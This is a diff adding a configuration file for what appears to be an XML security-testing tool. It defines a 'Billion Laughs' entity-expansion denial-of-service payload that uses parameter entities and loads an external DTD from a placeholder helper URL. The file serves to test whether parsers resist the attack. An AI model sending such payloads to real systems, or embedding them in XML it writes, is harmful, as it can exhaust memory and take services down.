@@ -1,0 +1,22 @@
+<config>
+<name>Billion Laughs Attack - Parameter Entities</name>
+<description>...</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>true</helperURL>
+    <attackListenerURL>false</attackListenerURL>
+</params>
+<attackvectors>
+<attackvector><![CDATA[<!DOCTYPE data SYSTEM "§tf_helperURL§" [
+<!ELEMENT data (#PCDATA)>
+]>
+<data>&g;</data>]]></attackvector>
+<attackvector><![CDATA[<!ENTITY % a0 "dos" >
+<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
+<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
+<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
+<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
+<!ENTITY g  "%a4;" >]]></attackvector>
+</attackvectors>
+</config>
